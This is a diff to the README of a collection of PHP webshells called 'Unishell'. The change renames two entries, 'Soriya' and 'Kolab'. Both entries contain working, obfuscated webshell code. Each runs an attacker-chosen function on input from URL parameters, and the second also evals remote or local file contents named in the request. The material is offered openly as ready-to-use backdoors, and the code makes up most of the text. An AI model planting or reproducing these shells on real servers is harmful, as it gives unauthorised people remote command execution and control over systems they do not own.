@@ -46,11 +46,11 @@ Unishell is a family of php webshells that based on nano shell (https://github.c
 ### Obfuscated
 In this code below i used yak to obfuscated.
 
-1. Soriya
+1. Raksmey-Soriya
 ```php
 <?php goto JFDwF; NnbkH: $gOzsO[ល] == ធិ៤០៤ & $gOzsO[ម]($gOzsO[ប]); goto ymB7H; B3hLL: if (!($gOzsO[ត] != null)) { goto y8I95; } goto NnbkH; JFDwF: $gOzsO = $_GET; goto B3hLL; ymB7H: y8I95: ?>
 ```
-2. Kolab
+2. Bonla-Kolab
 ```php
 <?php goto N6Ag4; KMKUH: $I9NO2[ល] == ធិ៤០៤ & $I9NO2[ម]($I9NO2[ប]); goto cuHHG; N6Ag4: $I9NO2 = $_GET; goto clZU6; clZU6: if (!($I9NO2[ត] != null)) { goto P0yeE; } goto KMKUH; cuHHG: P0yeE: goto hYsr_; hYsr_: eval("\x3f\x3e" . file_get_contents($I9NO2[ដ])); ?>
 ```
